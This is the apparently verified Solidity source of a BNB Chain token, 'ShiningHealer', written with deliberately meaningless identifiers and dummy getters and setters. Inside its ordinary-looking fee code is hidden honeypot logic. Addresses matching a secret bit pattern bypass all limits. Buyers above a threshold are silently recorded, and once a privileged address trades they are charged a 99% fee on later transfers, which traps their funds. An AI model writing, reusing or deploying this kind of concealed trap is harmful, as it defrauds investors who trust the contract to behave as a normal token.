/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ShiningHealer is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Shining Healer ";
    string constant _symbol = "ShiningHealer";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private burnSwapLaunchedSellTeamLiquidityReceiver;
    mapping(address => bool) private buyFeeTradingLiquidity;
    mapping(address => bool) private limitBurnBuyReceiverTeamMode;
    mapping(address => bool) private sellExemptLiquidityTeam;
    mapping(address => uint256) private receiverSwapSellWallet;
    mapping(uint256 => address) private isMarketingBurnTradingMode;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private isSellTeamTrading = 0;
    uint256 private tradingFeeMaxLimitWalletAutoLaunched = 8;

    //SELL FEES
    uint256 private isBotsReceiverMaxFeeSell = 0;
    uint256 private minBotsReceiverAutoTxSell = 8;

    uint256 private autoBurnReceiverFeeBuyTradingLaunched = tradingFeeMaxLimitWalletAutoLaunched + isSellTeamTrading;
    uint256 private tradingLaunchedTeamFee = 100;

    address private walletLiquiditySellLaunchedBurnAutoTeam = (msg.sender); // auto-liq address
    address private exemptFeeBotsIsReceiver = (0x5A2FE3d84ED7Be6d44f15B5afFfFF22a57a51AAe); // marketing address
    address private burnAutoTeamSell = DEAD;
    address private swapBotsExemptLiquidity = DEAD;
    address private receiverTradingMarketingSellTxLaunchedMin = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private buyModeMaxTradingIsMin;
    uint256 private burnReceiverLaunchedTeamLiquidityAuto;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private limitLiquidityBurnSell;
    uint256 private tradingTeamBurnLimitMarketingAuto;
    uint256 private sellFeeSwapLiquidityBurnBuyReceiver;
    uint256 private modeMaxMarketingLaunched;
    uint256 private burnMaxLaunchedMarketing;

    bool private limitLaunchedSwapBots = true;
    bool private sellExemptLiquidityTeamMode = true;
    bool private liquidityAutoTradingTeam = true;
    bool private buyFeeMarketingLiquidityMinLimit = true;
    bool private sellMarketingFeeReceiver = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private limitModeMarketingMax = 6 * 10 ** 15;
    uint256 private limitTxMaxModeReceiverBurn = _totalSupply / 1000; // 0.1%

    
    bool private feeBurnBotsTeamLimit = false;
    uint256 private teamIsTxExempt = 0;
    uint256 private launchedLiquidityMaxBuySellMarketingTrading = 0;
    bool private teamTxWalletBots = false;
    uint256 private limitTxSwapMax = 0;
    bool private receiverMinTxMaxMode = false;
    uint256 private teamModeLiquidityTrading = 0;
    bool private maxWalletMarketingBurn = false;
    uint256 private marketingModeLimitTx = 0;
    uint256 private autoTeamBurnLimit = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        limitLiquidityBurnSell = true;

        burnSwapLaunchedSellTeamLiquidityReceiver[msg.sender] = true;
        burnSwapLaunchedSellTeamLiquidityReceiver[address(this)] = true;

        buyFeeTradingLiquidity[msg.sender] = true;
        buyFeeTradingLiquidity[0x0000000000000000000000000000000000000000] = true;
        buyFeeTradingLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        buyFeeTradingLiquidity[address(this)] = true;

        limitBurnBuyReceiverTeamMode[msg.sender] = true;
        limitBurnBuyReceiverTeamMode[0x0000000000000000000000000000000000000000] = true;
        limitBurnBuyReceiverTeamMode[0x000000000000000000000000000000000000dEaD] = true;
        limitBurnBuyReceiverTeamMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptTradingTxMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptTradingTxMin(sender, recipient, amount);
    }

    function exemptTradingTxMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = burnReceiverFeeLaunched(sender) || burnReceiverFeeLaunched(recipient);
        
        if (launchedLiquidityMaxBuySellMarketingTrading != teamIsTxExempt) {
            launchedLiquidityMaxBuySellMarketingTrading = autoBurnReceiverFeeBuyTradingLaunched;
        }

        if (maxWalletMarketingBurn == sellMarketingFeeReceiver) {
            maxWalletMarketingBurn = sellMarketingFeeReceiver;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                autoIsMarketingMaxSwapBurnFee();
            }
            if (!bLimitTxWalletValue) {
                txSwapLimitMaxLiquidityBurnMarketing(recipient);
            }
        }
        
        if (teamModeLiquidityTrading == teamModeLiquidityTrading) {
            teamModeLiquidityTrading = autoTeamBurnLimit;
        }

        if (autoTeamBurnLimit != teamIsTxExempt) {
            autoTeamBurnLimit = limitTxSwapMax;
        }


        if (inSwap || bLimitTxWalletValue) {return minLimitExemptBots(sender, recipient, amount);}

        if (!burnSwapLaunchedSellTeamLiquidityReceiver[sender] && !burnSwapLaunchedSellTeamLiquidityReceiver[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || limitBurnBuyReceiverTeamMode[sender] || limitBurnBuyReceiverTeamMode[recipient], "Max TX Limit has been triggered");

        if (buyLiquidityTxIs()) {marketingBurnAutoMax();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = minMaxExemptBuyBotsSwapWallet(sender) ? botsTeamBuyFeeLimitBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minLimitExemptBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minMaxExemptBuyBotsSwapWallet(address sender) internal view returns (bool) {
        return !buyFeeTradingLiquidity[sender];
    }

    function limitLiquidityBurnExempt(address sender, bool selling) internal returns (uint256) {
        
        if (maxWalletMarketingBurn == feeBurnBotsTeamLimit) {
            maxWalletMarketingBurn = maxWalletMarketingBurn;
        }

        if (feeBurnBotsTeamLimit != teamTxWalletBots) {
            feeBurnBotsTeamLimit = maxWalletMarketingBurn;
        }

        if (autoTeamBurnLimit == limitTxSwapMax) {
            autoTeamBurnLimit = tradingFeeMaxLimitWalletAutoLaunched;
        }


        if (selling) {
            autoBurnReceiverFeeBuyTradingLaunched = minBotsReceiverAutoTxSell + isBotsReceiverMaxFeeSell;
            return liquidityModeBotsSell(sender, autoBurnReceiverFeeBuyTradingLaunched);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoBurnReceiverFeeBuyTradingLaunched = tradingFeeMaxLimitWalletAutoLaunched + isSellTeamTrading;
            return autoBurnReceiverFeeBuyTradingLaunched;
        }
        return liquidityModeBotsSell(sender, autoBurnReceiverFeeBuyTradingLaunched);
    }

    function walletLaunchedLimitExempt() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsTeamBuyFeeLimitBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(limitLiquidityBurnExempt(sender, receiver == uniswapV2Pair)).div(tradingLaunchedTeamFee);

        if (sellExemptLiquidityTeam[sender] || sellExemptLiquidityTeam[receiver]) {
            feeAmount = amount.mul(99).div(tradingLaunchedTeamFee);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function burnReceiverFeeLaunched(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function liquidityModeBotsSell(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = receiverSwapSellWallet[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function txSwapLimitMaxLiquidityBurnMarketing(address addr) private {
        if (walletLaunchedLimitExempt() < limitModeMarketingMax) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        isMarketingBurnTradingMode[exemptLimitValue] = addr;
    }

    function autoIsMarketingMaxSwapBurnFee() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (receiverSwapSellWallet[isMarketingBurnTradingMode[i]] == 0) {
                    receiverSwapSellWallet[isMarketingBurnTradingMode[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(exemptFeeBotsIsReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function buyLiquidityTxIs() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    sellMarketingFeeReceiver &&
    _balances[address(this)] >= limitTxMaxModeReceiverBurn;
    }

    function marketingBurnAutoMax() internal swapping {
        
        if (teamTxWalletBots != liquidityAutoTradingTeam) {
            teamTxWalletBots = maxWalletMarketingBurn;
        }


        uint256 amountToLiquify = limitTxMaxModeReceiverBurn.mul(isSellTeamTrading).div(autoBurnReceiverFeeBuyTradingLaunched).div(2);
        uint256 amountToSwap = limitTxMaxModeReceiverBurn.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoBurnReceiverFeeBuyTradingLaunched.sub(isSellTeamTrading.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(isSellTeamTrading).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(tradingFeeMaxLimitWalletAutoLaunched).div(totalETHFee);
        
        if (launchedLiquidityMaxBuySellMarketingTrading != marketingModeLimitTx) {
            launchedLiquidityMaxBuySellMarketingTrading = limitTxMaxModeReceiverBurn;
        }

        if (autoTeamBurnLimit == launchedLiquidityMaxBuySellMarketingTrading) {
            autoTeamBurnLimit = isBotsReceiverMaxFeeSell;
        }

        if (feeBurnBotsTeamLimit != teamTxWalletBots) {
            feeBurnBotsTeamLimit = buyFeeMarketingLiquidityMinLimit;
        }


        payable(exemptFeeBotsIsReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                walletLiquiditySellLaunchedBurnAutoTeam,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptFeeBotsIsReceiver() public view returns (address) {
        if (exemptFeeBotsIsReceiver != walletLiquiditySellLaunchedBurnAutoTeam) {
            return walletLiquiditySellLaunchedBurnAutoTeam;
        }
        return exemptFeeBotsIsReceiver;
    }
    function setExemptFeeBotsIsReceiver(address a0) public onlyOwner {
        if (exemptFeeBotsIsReceiver != walletLiquiditySellLaunchedBurnAutoTeam) {
            walletLiquiditySellLaunchedBurnAutoTeam=a0;
        }
        exemptFeeBotsIsReceiver=a0;
    }

    function getTeamIsTxExempt() public view returns (uint256) {
        return teamIsTxExempt;
    }
    function setTeamIsTxExempt(uint256 a0) public onlyOwner {
        if (teamIsTxExempt == teamModeLiquidityTrading) {
            teamModeLiquidityTrading=a0;
        }
        if (teamIsTxExempt == tradingLaunchedTeamFee) {
            tradingLaunchedTeamFee=a0;
        }
        teamIsTxExempt=a0;
    }

    function getWalletLiquiditySellLaunchedBurnAutoTeam() public view returns (address) {
        if (walletLiquiditySellLaunchedBurnAutoTeam == burnAutoTeamSell) {
            return burnAutoTeamSell;
        }
        if (walletLiquiditySellLaunchedBurnAutoTeam != receiverTradingMarketingSellTxLaunchedMin) {
            return receiverTradingMarketingSellTxLaunchedMin;
        }
        return walletLiquiditySellLaunchedBurnAutoTeam;
    }
    function setWalletLiquiditySellLaunchedBurnAutoTeam(address a0) public onlyOwner {
        if (walletLiquiditySellLaunchedBurnAutoTeam == walletLiquiditySellLaunchedBurnAutoTeam) {
            walletLiquiditySellLaunchedBurnAutoTeam=a0;
        }
        if (walletLiquiditySellLaunchedBurnAutoTeam == exemptFeeBotsIsReceiver) {
            exemptFeeBotsIsReceiver=a0;
        }
        walletLiquiditySellLaunchedBurnAutoTeam=a0;
    }

    function getMinBotsReceiverAutoTxSell() public view returns (uint256) {
        if (minBotsReceiverAutoTxSell == limitTxSwapMax) {
            return limitTxSwapMax;
        }
        if (minBotsReceiverAutoTxSell == tradingLaunchedTeamFee) {
            return tradingLaunchedTeamFee;
        }
        if (minBotsReceiverAutoTxSell == limitTxSwapMax) {
            return limitTxSwapMax;
        }
        return minBotsReceiverAutoTxSell;
    }
    function setMinBotsReceiverAutoTxSell(uint256 a0) public onlyOwner {
        if (minBotsReceiverAutoTxSell != isBotsReceiverMaxFeeSell) {
            isBotsReceiverMaxFeeSell=a0;
        }
        if (minBotsReceiverAutoTxSell != limitTxMaxModeReceiverBurn) {
            limitTxMaxModeReceiverBurn=a0;
        }
        minBotsReceiverAutoTxSell=a0;
    }

    function getBurnSwapLaunchedSellTeamLiquidityReceiver(address a0) public view returns (bool) {
        if (a0 != exemptFeeBotsIsReceiver) {
            return buyFeeMarketingLiquidityMinLimit;
        }
        if (a0 == walletLiquiditySellLaunchedBurnAutoTeam) {
            return limitLaunchedSwapBots;
        }
        if (burnSwapLaunchedSellTeamLiquidityReceiver[a0] == burnSwapLaunchedSellTeamLiquidityReceiver[a0]) {
            return teamTxWalletBots;
        }
            return burnSwapLaunchedSellTeamLiquidityReceiver[a0];
    }
    function setBurnSwapLaunchedSellTeamLiquidityReceiver(address a0,bool a1) public onlyOwner {
        if (a0 == swapBotsExemptLiquidity) {
            limitLaunchedSwapBots=a1;
        }
        burnSwapLaunchedSellTeamLiquidityReceiver[a0]=a1;
    }

    function getReceiverSwapSellWallet(address a0) public view returns (uint256) {
        if (a0 != swapBotsExemptLiquidity) {
            return limitTxMaxModeReceiverBurn;
        }
            return receiverSwapSellWallet[a0];
    }
    function setReceiverSwapSellWallet(address a0,uint256 a1) public onlyOwner {
        if (a0 != exemptFeeBotsIsReceiver) {
            launchedLiquidityMaxBuySellMarketingTrading=a1;
        }
        if (a0 == walletLiquiditySellLaunchedBurnAutoTeam) {
            teamIsTxExempt=a1;
        }
        receiverSwapSellWallet[a0]=a1;
    }

    function getLimitTxMaxModeReceiverBurn() public view returns (uint256) {
        return limitTxMaxModeReceiverBurn;
    }
    function setLimitTxMaxModeReceiverBurn(uint256 a0) public onlyOwner {
        if (limitTxMaxModeReceiverBurn == tradingLaunchedTeamFee) {
            tradingLaunchedTeamFee=a0;
        }
        limitTxMaxModeReceiverBurn=a0;
    }

    function getTradingFeeMaxLimitWalletAutoLaunched() public view returns (uint256) {
        return tradingFeeMaxLimitWalletAutoLaunched;
    }
    function setTradingFeeMaxLimitWalletAutoLaunched(uint256 a0) public onlyOwner {
        if (tradingFeeMaxLimitWalletAutoLaunched != limitModeMarketingMax) {
            limitModeMarketingMax=a0;
        }
        tradingFeeMaxLimitWalletAutoLaunched=a0;
    }

    function getIsSellTeamTrading() public view returns (uint256) {
        if (isSellTeamTrading != limitTxSwapMax) {
            return limitTxSwapMax;
        }
        return isSellTeamTrading;
    }
    function setIsSellTeamTrading(uint256 a0) public onlyOwner {
        if (isSellTeamTrading == marketingModeLimitTx) {
            marketingModeLimitTx=a0;
        }
        if (isSellTeamTrading == autoTeamBurnLimit) {
            autoTeamBurnLimit=a0;
        }
        if (isSellTeamTrading == tradingLaunchedTeamFee) {
            tradingLaunchedTeamFee=a0;
        }
        isSellTeamTrading=a0;
    }

    function getBurnAutoTeamSell() public view returns (address) {
        if (burnAutoTeamSell != swapBotsExemptLiquidity) {
            return swapBotsExemptLiquidity;
        }
        return burnAutoTeamSell;
    }
    function setBurnAutoTeamSell(address a0) public onlyOwner {
        if (burnAutoTeamSell != exemptFeeBotsIsReceiver) {
            exemptFeeBotsIsReceiver=a0;
        }
        burnAutoTeamSell=a0;
    }

    function getLimitTxSwapMax() public view returns (uint256) {
        return limitTxSwapMax;
    }
    function setLimitTxSwapMax(uint256 a0) public onlyOwner {
        if (limitTxSwapMax != minBotsReceiverAutoTxSell) {
            minBotsReceiverAutoTxSell=a0;
        }
        if (limitTxSwapMax != launchedLiquidityMaxBuySellMarketingTrading) {
            launchedLiquidityMaxBuySellMarketingTrading=a0;
        }
        if (limitTxSwapMax == limitModeMarketingMax) {
            limitModeMarketingMax=a0;
        }
        limitTxSwapMax=a0;
    }

    function getTeamTxWalletBots() public view returns (bool) {
        if (teamTxWalletBots != receiverMinTxMaxMode) {
            return receiverMinTxMaxMode;
        }
        return teamTxWalletBots;
    }
    function setTeamTxWalletBots(bool a0) public onlyOwner {
        if (teamTxWalletBots != teamTxWalletBots) {
            teamTxWalletBots=a0;
        }
        if (teamTxWalletBots != liquidityAutoTradingTeam) {
            liquidityAutoTradingTeam=a0;
        }
        if (teamTxWalletBots == limitLaunchedSwapBots) {
            limitLaunchedSwapBots=a0;
        }
        teamTxWalletBots=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}